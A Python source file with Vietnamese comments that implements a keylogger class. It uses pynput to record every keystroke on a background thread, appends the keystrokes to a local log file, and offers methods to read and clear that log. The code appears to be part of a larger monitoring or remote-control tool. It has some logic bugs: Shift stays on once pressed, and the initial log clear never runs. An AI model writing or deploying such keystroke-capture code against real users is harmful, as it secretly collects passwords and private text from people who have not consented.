# Import thư viện pynput để tương tác với sự kiện từ bàn phím và import thư viện threading để hỗ trợ việc sử dụng luồng đồng thời.
from pynput import keyboard
import threading

# Định nghĩa lớp Keylogger.
class Keylogger:
    def __init__(self, path="./tmp_files/keylog.txt"):
        # Khởi tạo đối tượng Keylogger với đường dẫn file log mặc định là "./tmp_files/keylog.txt".
        self.path = path
        self.caps = False  # Trạng thái của phím Caps Lock
        self.shift = False  # Trạng thái của phím Shift
        self.thread = None  # Đối tượng Thread để quản lý việc lắng nghe phím
        self.listener = None  # Đối tượng Listener để lắng nghe sự kiện phím
        self.clear_log()  # Xóa nội dung file log trước khi bắt đầu lắng nghe phím

    # Phương thức start lắng nghe phím.
    def start(self):
        self.thread = threading.Thread(target=self._start_listening)
        self.thread.start()

    # Phương thức stop lắng nghe phím.
    def stop(self):
        if self.thread and self.thread.is_alive():
            self._stop_listening()
            self.thread.join()

    # Phương thức xóa nội dung file log.
    def clear_log(self):
        if not self.thread or not self.thread.is_alive():
            return "Keylogger is not running"
        with open(self.path, "w") as file:
            file.write("")

    # Phương thức đọc nội dung file log.
    def read_log(self):
        if not self.thread or not self.thread.is_alive():
            return "Keylogger is not running"
        with open(self.path, "r") as file:
            content = file.read()
        if not content.strip():
            return "Log is empty"
        return content

    # Phương thức bắt đầu lắng nghe sự kiện phím.
    def _start_listening(self):
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        self.listener.join()

    # Phương thức dừng lắng nghe sự kiện phím.
    def _stop_listening(self):
        if self.listener:
            self.listener.stop()

    # Phương thức xử lý sự kiện phím được nhấn.
    def _on_press(self, key):
        try:
            # Kiểm tra và xử lý các trạng thái phím Caps Lock và Shift
            if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                self.shift = True
            elif key == keyboard.Key.caps_lock:
                self.caps = not self.caps

            char = None
            if hasattr(key, 'char'):
                char = key.char
                if char.isalpha():
                    char = self._handle_alphabetic_keys(char)
                with open(self.path, "a") as file:
                    file.write(char)
            else: 
                char = self._handle_special_keys(key)
                with open(self.path, "a") as file:
                    file.write(char)
        except AttributeError:
            pass
    
    # Phương thức xử lý các phím đặc biệt.
    def _handle_special_keys(self, key):
        # Danh sách các phím đặc biệt và tương ứng với nội dung của chúng.
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "Enter\n",
            keyboard.Key.backspace: "Backspace",
            keyboard.Key.tab: "Tab",
            keyboard.Key.caps_lock: "Caps Lock",
            keyboard.Key.ctrl: "Ctrl",
            keyboard.Key.alt: "Alt",
            keyboard.Key.esc: "Escape",
            keyboard.Key.left: "Left",
            keyboard.Key.right: "Right",
            keyboard.Key.up: "Up",
            keyboard.Key.down: "Down",
            keyboard.Key.delete: "Delete",
            keyboard.Key.home: "Home",
            keyboard.Key.end: "End",
            keyboard.Key.page_up: "Page Up",
            keyboard.Key.page_down: "Page Down",
            keyboard.Key.insert: "Insert",
            keyboard.Key.menu: "Menu",
            keyboard.Key.media_play_pause: "Media Play/Pause",
            keyboard.Key.media_volume_mute: "Media Volume Mute",
            keyboard.Key.media_volume_up: "Media Volume Up",
            keyboard.Key.media_volume_down: "Media Volume Down",
            keyboard.Key.media_previous: "Media Previous",
            keyboard.Key.media_next: "Media Next",
            keyboard.Key.f1: "F1",
            keyboard.Key.f2: "F2",
            keyboard.Key.f3: "F3",
            keyboard.Key.f4: "F4",
            keyboard.Key.f5: "F5",
            keyboard.Key.f6: "F6",
            keyboard.Key.f7: "F7",
            keyboard.Key.f8: "F8",
            keyboard.Key.f9: "F9",
            keyboard.Key.f10: "F10",
            keyboard.Key.f11: "F11",
            keyboard.Key.f12: "F12"
        }
        
        # Trả về tên của phím đặc biệt nếu có trong danh sách, ngược lại trả về chuỗi trống.
        if key in special_keys:
            return special_keys[key]

        return ""

    # Phương thức xử lý các phím chữ.
    def _handle_alphabetic_keys(self, char):
        # Xử lý việc viết hoa/viết thường dựa trên trạng thái của phím Shift và Caps Lock.
        if self.shift ^ self.caps:
            char = char.upper()
        else:
            char = char.lower()
        return char
